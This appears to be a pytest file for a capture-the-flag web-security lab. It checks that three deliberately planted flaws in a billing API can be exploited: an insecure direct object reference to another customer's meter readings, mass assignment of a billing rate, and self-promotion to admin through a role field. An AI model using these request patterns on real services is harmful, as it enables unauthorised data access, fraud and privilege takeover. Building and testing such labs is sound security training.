# NOTE: role escalation permanently promotes whichever account performs it.
# devon is deliberately kept OUT of this test (see conftest.py) because it's
# reused as the read-only "attacker" account for IDOR here and for
# privilege escalation in test_09 -- farid is used instead, and isn't
# needed as a customer anywhere later in the suite.


def test_idor_teach(devon, base_url, redeem_flag_fn):
    # meter id 2 belongs to a different seeded customer than devon.
    resp = devon.get(f"{base_url}/api/meters/2/readings", timeout=10)
    assert resp.status_code == 200
    flag = resp.json().get("flag")
    assert flag
    assert redeem_flag_fn(devon, base_url, flag)


def test_massassign_exercise(farid, base_url, redeem_flag_fn):
    resp = farid.patch(f"{base_url}/api/account", json={"billing_rate": 0.01}, timeout=10)
    assert resp.status_code == 200
    flag = resp.json().get("flag")
    assert flag
    assert redeem_flag_fn(farid, base_url, flag)


def test_role_escalation_bonus(farid, base_url, redeem_flag_fn):
    resp = farid.patch(f"{base_url}/api/account", json={"role": "admin"}, timeout=10)
    assert resp.status_code == 200
    flag = resp.json().get("role_flag")
    assert flag
    assert redeem_flag_fn(farid, base_url, flag)
